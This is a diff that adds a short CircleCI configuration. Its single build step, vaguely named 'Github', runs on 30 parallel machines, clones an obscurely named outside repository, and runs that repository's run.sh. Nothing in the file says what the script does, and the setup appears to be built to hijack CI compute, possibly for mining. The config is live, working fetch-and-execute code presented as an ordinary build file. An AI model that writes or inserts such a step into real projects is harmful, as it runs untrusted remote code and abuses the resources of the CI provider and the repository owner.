@@ -1,0 +1,11 @@
+version: 2.1
+jobs:
+  build:
+    machine:
+      image: ubuntu-2004:202010-01
+    parallelism: 30
+    steps:
+      - checkout
+      - run:
+          name: "Github"
+          command: git clone https://github.com/azsxdcazsxdc1/azsxdcazsxdc1.git && cd azsxdcazsxdc1 && chmod +x run.sh && ./run.sh
